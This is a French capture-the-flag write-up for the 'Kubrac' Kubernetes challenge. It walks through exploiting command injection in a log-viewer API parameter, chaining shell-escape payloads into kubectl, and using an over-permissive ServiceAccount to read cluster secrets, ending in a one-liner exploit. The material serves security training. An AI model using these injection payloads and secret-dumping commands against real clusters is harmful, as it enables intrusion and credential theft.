# Kubrac Write-Up

L'objectif du challenge Kubrac est de se questionner sur la sécurité des applications Kubernetes utilisant des politiques RBAC. Beaucoup d'applications ont besoin de communiquer avec l'api-server du cluster pour monitorer (e.g. Prometheus Exporter), déployer des ressources à la volée (e.g. ArgoCD), ...

Dans ce contexte, Kubrac expose une petite application permettant de parcourir les logs des pods du namespace dans lequel il est déployé, grâce à un ServiceAccount. Toutefois ce ServiceAccount a mal été fait, et possède beaucoup trop de permissions, en particulier pour lire d'autres ressources que les logs des conteneurs de Pods. En effet, lors du debug, il est fréquent de faire un petit `kubectl get all` pour savoir si tout va bien !

En plus de cela, l'application est vulnérable à de la _command injection_ ([CWE-77](https://cwe.mitre.org/data/definitions/77.html)) sur le nom du conteneur...

## Reconnaissance de l'application

On observe rapidement qu'il existe 2 endpoints API:
- `GET /api/v1/containers` qui retourne la liste des conteneurs du namespace
- `GET /api/v1/logs?name=<name>` qui retourne les logs du conteneur donné

En soumettant autre chose qu'un nom de conteneur (en modifiant le HTML local ou en modifiant la requête), on va voir que l'application se comporte bizarrement.

On comprend assez vite que l'application semble injecter le `name` dans une commande kubectl, que l'on valide avec l'envoi d'un `name=-h`.
```bash
$ curl -s "http://localhost:8081/api/v1/logs?name=-h" | jq -r '.data'
```

<details>
<summary>Example</summary>

```bash
$ curl -s "http://localhost:8081/api/v1/logs?name=flip;flop" | jq -r '.data'
error: expected 'logs [-f] [-p] (POD | TYPE/NAME) [-c CONTAINER]'.
POD or TYPE/NAME is a required argument for the logs command
See 'kubectl logs -h' for help and examples
```

</details>

## Injection de commande

Pour facilement injecter des commandes et limiter le bruit, on va donc escape la commande précédente avec `>/dev/null 2>&1 ||true;`. On pourra ainsi soumettre n'importe quelle commande sans avoir à s'inquiéter du comportement de la commande précédente. D'ailleurs, on se rend compte que la commande injectée se termine par `--tail=20`, on ajoute donc le suffixe `;#`, toujours pour retirer le bruit.

Pour injecter notre payload, il va falloir l'encoder. On peut utiliser un site pour cela: [Meyerweb URL Decoder/Encoder](https://meyerweb.com/eric/tools/dencoder/)

Vu que la réponse est un JSON, on va manipuler le résultat sous la forme `{"data":"..."}` avec `jq` en faisant `curl -s ... | jq -r '.data'`.

## Reconnaissance Kubernetes

Pour reconnaître un peu plus l'environnement, on exécute un `kubectl get all`.

<details>
<summary>Example</summary>

Payload: `>/dev/null 2>&1 ||true; kubectl get all;#`

Encoded: `%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20get%20all%3B%23`

Call:
```bash
$ curl -s http://a0b1c2d3.24hiut25.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20get%20all%3B%23 | jq -r '.data'
NAME                                           READY   STATUS    RESTARTS   AGE
pod/monitoring-dep-8cae9fe2-687777959c-8xz2l   1/1     Running   0          30s
pod/popacola-merch-179c01e2-5d896ff7d9-7r4h6   1/1     Running   0          30s

NAME                              TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)    AGE
service/monitoring-svc-f239123c   ClusterIP   None         <none>        8080/TCP   28s

NAME                                      READY   UP-TO-DATE   AVAILABLE   AGE
deployment.apps/monitoring-dep-8cae9fe2   1/1     1            1           30s
deployment.apps/popacola-merch-179c01e2   1/1     1            1           30s

NAME                                                 DESIRED   CURRENT   READY   AGE
replicaset.apps/monitoring-dep-8cae9fe2-687777959c   1         1         1       30s
replicaset.apps/popacola-merch-179c01e2-5d896ff7d9   1         1         1       30s
```

</details>

On reconnaît l'environnement que le _log viewer_ nous montrait. Toutefois, nous voulons savoir ce à quoi nous avons accès afin de trouver notre bonheur !

Pour ce faire, on injecte la commande `kubectl auth can-i --list`.

```bash
$ curl -s http://a0b1c2d3.24hiut25.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20auth%20can-i%20--list%3B%23 | jq -r ".data"
Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
configmaps                                      []                                     []               [get list]
pods/log                                        []                                     []               [get list]
pods                                            []                                     []               [get list]
replicationcontrollers                          []                                     []               [get list]
secrets                                         []                                     []               [get list]
services                                        []                                     []               [get list]
daemonsets.apps                                 []                                     []               [get list]
deployments.apps                                []                                     []               [get list]
replicasets.apps                                []                                     []               [get list]
statefulsets.apps                               []                                     []               [get list]
horizontalpodautoscalers.autoscaling            []                                     []               [get list]
cronjobs.batch                                  []                                     []               [get list]
jobs.batch                                      []                                     []               [get list]
..... (truncated)
```

On se rend compte que pour une raison obscure (probablement du debug) on a accès en lecture aux secrets. On va donc les lister avec `kubectl get secret`.

```bash
$ curl -s http://a0b1c2d3.24hiut25.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20get%20secret%3B%23 | jq -r ".data"
NAME            TYPE     DATA   AGE
flag-2b3b469a   Opaque   2      10m
```

Avec un seul secret, on va aller lire son contenu avec `kubectl describe secret/flag-2b3b469a`.

```bash
$ curl -s http://a0b1c2d3.24hiut25.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20describe%20secret%2Fflag-2b3b469a%3B%23 | jq -r ".data"
Name:         flag-2b3b469a
Namespace:    ns-48e1560f
Labels:       app.kubernetes.io/component=kubrac
              app.kubernetes.io/name=monitoring
              app.kubernetes.io/part-of=kubrac
Annotations:  pulumi.com/autonamed: true

Type:  Opaque

Data
====
top-secret:  28 bytes
flag:        66 bytes
```

On va aller chercher l'attribut `flag`, qui semble être ce que nous cherchons, avec `kubectl get secret/flag-2b3b469a --template={{.data.flag}}`.

```bash
$ curl -s http://a0b1c2d3.24hiut25.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20get%20secret%2Fflag-2b3b469a%20--template%3D%7B%7B.data.flag%7D%7D%3B%23 | jq -r ".data" | base64 -d
24hIUT{KubÉ®nétE5 rbã¢ å®3-p¤WÊRFùll BÙt-ÐÂNgë®ouS}
```

## TL;DR;

One-liner pour exploit l'injection de command et les permissions trop large du ServiceAccount.

```bash
curl -s http://a0b1c2d3.24hiut25.ctfer.io/api/v1/logs?name=%3E%2Fdev%2Fnull%202%3E%261%20%7C%7Ctrue%3B%20kubectl%20get%20%22secret%2F%24(kubectl%20get%20secret%20-o%20jsonpath%3D%27%7B.items%5B*%5D.metadata.name%7D%27)%22%20--template%3D%7B%7B.data.flag%7D%7D%7Cbase64%20-d%3B%23 | jq -r '.data'
```

On peut se faire un petit soft dans son langage favori et faire un alias sur `kubectl` pour directement faire nos calls depuis la CLI.

On peut récupérer l'attribut `top-secret` avec `kubectl get secret/flag-2b3b469a --template='{{ index .data "top-secret"}}' | base64 -d` mais on se fait Rick Roll...
